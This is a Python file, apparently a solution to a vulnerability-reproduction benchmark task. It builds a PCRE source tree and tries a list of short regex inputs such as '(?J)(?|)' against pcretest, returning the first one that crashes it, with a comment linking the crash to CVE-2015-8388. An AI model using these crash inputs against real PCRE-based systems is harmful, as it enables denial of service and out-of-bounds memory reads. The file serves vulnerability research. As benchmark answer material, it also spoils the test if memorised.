import os
import tarfile
import tempfile
import subprocess

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        Target: PCRE (Stack Buffer Overflow / OOB Read)
        Vulnerability: Fewer capturing parentheses than available space in external ovector.
        Reference: CVE-2015-8388 (likely)
        Ground-truth length: 8 bytes
        """
        
        # Candidate PoCs
        # 1. (?J)(?|)\n -> 8 bytes. Triggers OOB read in pcre_exec (CVE-2015-8388)
        # 2. \((?1)\)\n -> 8 bytes. Stack recursion overflow.
        # 3. /(?J)(?|)/\n -> pcretest format
        candidates = [
            b'(?J)(?|)\n',
            b'(?J)(?|)',
            b'\\((?1)\\)\n',
            b'/(?J)(?|)/\n',
            b'((?1))\n',
            b'/(?|)/\n'
        ]

        try:
            with tempfile.TemporaryDirectory() as temp_dir:
                # Extract the source code
                try:
                    with tarfile.open(src_path) as tar:
                        tar.extractall(path=temp_dir)
                except Exception:
                    # If extraction fails, fallback to the most likely PoC
                    return candidates[0]

                # Locate the actual source root (handle nested directories)
                src_root = temp_dir
                entries = os.listdir(temp_dir)
                if len(entries) == 1 and os.path.isdir(os.path.join(temp_dir, entries[0])):
                    src_root = os.path.join(temp_dir, entries[0])

                # Build the project
                # Assume autotools/configure based on PCRE nature
                configure_path = os.path.join(src_root, 'configure')
                
                if os.path.exists(configure_path):
                    subprocess.run(
                        ['./configure', '--disable-shared', '--disable-cpp'],
                        cwd=src_root,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL
                    )
                
                # Run make (works for Makefile-only projects too)
                subprocess.run(
                    ['make', '-j8'],
                    cwd=src_root,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )

                # Identify the harness/executable
                # Priority: pcretest (standard test driver) or a custom binary
                target_bin = None
                possible_bins = ['pcretest', 'arvo', 'vuln']
                
                # Check known paths first
                for p in [os.path.join(src_root, 'pcretest'), os.path.join(src_root, '.libs', 'pcretest')]:
                    if os.path.exists(p) and os.access(p, os.X_OK):
                        target_bin = p
                        break
                
                # Scan if not found
                if not target_bin:
                    for root, _, files in os.walk(src_root):
                        for f in files:
                            if f in possible_bins or (f.endswith('') and '.' not in f and os.access(os.path.join(root, f), os.X_OK)):
                                # Avoid build scripts
                                if f in ['configure', 'config.status', 'libtool', 'depcomp', 'missing', 'install-sh']:
                                    continue
                                target_bin = os.path.join(root, f)
                                if 'pcretest' in f: # Prefer pcretest
                                    break
                        if target_bin and 'pcretest' in target_bin: break

                # Verify candidates against the binary
                if target_bin:
                    for cand in candidates:
                        try:
                            # Run the binary with candidate input
                            proc = subprocess.Popen(
                                [target_bin],
                                stdin=subprocess.PIPE,
                                stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL
                            )
                            proc.communicate(input=cand, timeout=1)
                            
                            # Check for crash (non-zero exit code)
                            # pcretest typically exits 0 on success or syntax error, non-zero on crash/error
                            if proc.returncode != 0:
                                return cand
                        except subprocess.TimeoutExpired:
                            proc.kill()
                            # Timeout could be infinite loop (DoS), potentially valid, but risky.
                            continue
                        except Exception:
                            continue

        except Exception:
            pass

        # Default fallback if build/test fails
        # Matches the specific vulnerability description "fewer capturing parentheses... ovector"
        return candidates[0]
